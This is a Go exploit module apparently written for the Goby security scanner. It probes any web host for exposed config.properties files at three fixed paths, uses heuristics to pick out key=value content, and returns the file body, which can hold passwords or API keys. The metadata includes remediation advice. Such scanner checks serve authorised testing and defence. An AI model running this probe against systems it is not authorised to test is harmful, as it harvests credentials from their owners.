package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Configuration file information leakage vulnerability",
    "Description": "<p>Due to improper configuration of the application system, relevant security risks were not considered, causing the leakage of relevant configuration files and leakage of relevant configurations.</p><p>Attackers obtain sensitive data through configuration information leakage, create conditions for further attacks, and set up direct control of databases or websites through leaked configurations.</p>",
    "Product": "无",
    "Homepage": "无",
    "DisclosureDate": "2023-12-19",
    "PostTime": "2023-12-25",
    "Author": "Gryffinbit@gmail.com",
    "FofaQuery": "protocol=\"http\" || protocol=\"https\"",
    "GobyQuery": "protocol=\"http\" || protocol=\"https\"",
    "Level": "2",
    "Impact": "<p>Configuration file leaks may bring serious security and privacy issues. Configuration files often contain sensitive information of applications, services or systems, such as database connection strings, API keys, passwords, etc. Once this information is leaked, attackers may use these credentials to access and tamper with sensitive data.</p>",
    "Recommendation": "<p>1. Restrict access rights: Ensure that only authorized personnel can access the configuration file and limit read and write permissions on the file.</p><p>2. Regular Review and Update: Regularly review the configuration file to ensure that the information in it is up to date and remove information that is no longer needed.</p><p>3. Monitoring and logging: Implement monitoring and logging to detect illegal access or modification of configuration files and take timely measures to deal with potential security threats.</p><p>4. WAF level: configure rules for interception</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "配置文件信息泄漏漏洞",
            "Product": "无",
            "Description": "<p>应用系统由于配置不当，没有考虑相关的安全隐患，造成相关的配置文件泄露，泄露相关的配置。<br></p><p>攻击者通过配置信息泄露获取敏感数据，为进一步攻击创造条件，设置通过泄露的配置直接控制数据库或网站。<br></p>",
            "Recommendation": "<p>1. 限制访问权限： 确保只有授权人员能够访问配置文件，限制对文件的读写权限。</p><p>2. 定期审查和更新： 定期审查配置文件，确保其中的信息是最新的，并且删除不再需要的信息。</p><p>3. 监控和日志： 实施监控和日志记录，以检测对配置文件的非法访问或修改，并及时采取措施应对潜在的安全威胁。</p><p>4. WAF 层面：配置规则进行拦截</p>",
            "Impact": "<p>配置文件泄漏可能带来严重的安全和隐私问题，配置文件通常包含应用程序、服务或系统的敏感信息，例如数据库连接字符串、API密钥、密码等。一旦这些信息泄漏，攻击者可能会利用这些凭据来访问和篡改敏感数据。</p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Configuration file information leakage vulnerability",
            "Product": "无",
            "Description": "<p>Due to improper configuration of the application system, relevant security risks were not considered, causing the leakage of relevant configuration files and leakage of relevant configurations.</p><p>Attackers obtain sensitive data through configuration information leakage, create conditions for further attacks, and set up direct control of databases or websites through leaked configurations.</p>",
            "Recommendation": "<p>1. Restrict access rights: Ensure that only authorized personnel can access the configuration file and limit read and write permissions on the file.</p><p>2. Regular Review and Update: Regularly review the configuration file to ensure that the information in it is up to date and remove information that is no longer needed.</p><p>3. Monitoring and logging: Implement monitoring and logging to detect illegal access or modification of configuration files and take timely measures to deal with potential security threats.</p><p>4. WAF level: configure rules for interception</p>",
            "Impact": "<p>Configuration file leaks may bring serious security and privacy issues. Configuration files often contain sensitive information of applications, services or systems, such as database connection strings, API keys, passwords, etc. Once this information is leaked, attackers may use these credentials to access and tamper with sensitive data.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10899"
}`
	sendPayloadY83dRF9edvgG := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		matchRegexp, _ := regexp.Compile(`\w+[:=]{1} {0,}[\.\S]+`)
		htmlTags := []string{`<html>`, `</html>`, `<head>`, `</head>`, `<body>`, `</body>`, `<script`, `</script>`, `<style`, `</style>`, `<title>`, `</title>`, `<pre>`, `<h1>`, `<br>`, `<?xml`, `<result>`, `<b>`, `</b>`, `<meta`}
		for _, uri := range []string{"/config.properties", "/portal/conf/config.properties", "/conf/config.properties"} {
			uriConfig := httpclient.NewGetRequestConfig(uri)
			uriConfig.VerifyTls = false
			uriConfig.FollowRedirect = false
			resp, err := httpclient.DoHttpRequest(hostInfo, uriConfig)
			if err != nil {
				return nil, err
			} else if resp == nil {
				continue
			}
			// fix bug  http://10.10.10.112/zentao/task-view-8813.html?tid=5l8x2kuc
			if resp.StatusCode != 200 || len(resp.RawBody) > 5000 || strings.Contains(resp.RawBody, `invalid service url`) || strings.Contains(resp.RawBody, `Unauthorized`) || strings.Contains(resp.Utf8Html, `拒绝访问`) || strings.Contains(resp.Utf8Html, `无效用户`) {
				continue
			}
			// fix json format
			if (strings.HasPrefix(strings.TrimSpace(resp.RawBody), `{`) && strings.HasSuffix(strings.TrimSpace(resp.RawBody), `}`)) || (strings.HasPrefix(strings.TrimSpace(resp.RawBody), `[`) && strings.HasSuffix(strings.TrimSpace(resp.RawBody), `]`)) {
				continue
			}
			// fix ASCII [\x00-\x1F\x7F-\xFF]
			if len(regexp.MustCompile(`[\x00-\x1F\x7F-\xFF]`).FindAllString(resp.RawBody, -1)) > 10 {
				continue
			}
			hasHtmlTag := false
			for _, tag := range htmlTags {
				if strings.Contains(strings.ToLower(resp.RawBody), tag) {
					hasHtmlTag = true
					break
				}
			}
			if hasHtmlTag || (resp.Header != nil && strings.Contains(strings.ToLower(resp.HeaderString.String()), `audio/mpeg`)) {
				continue
			}
			matchCount := len(matchRegexp.FindAllString(resp.RawBody, -1))
			lineCount := len(strings.Split(resp.RawBody, `\n`))
			if matchCount > int(math.Floor(float64(lineCount)*0.7)) {
				return resp, nil
			}
		}
		return nil, errors.New("漏洞利用失败")
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, err := sendPayloadY83dRF9edvgG(hostInfo)
			if resp != nil && err == nil {
				stepLogs.VulURL = hostInfo.FixedHostInfo + resp.Request.URL.Path
			}
			return resp != nil && err == nil
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if resp, err := sendPayloadY83dRF9edvgG(expResult.HostInfo); resp != nil && err == nil {
				expResult.Output = resp.Utf8Html
				expResult.Success = true
			} else if err != nil {
				expResult.Output = err.Error()
			} else {
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}
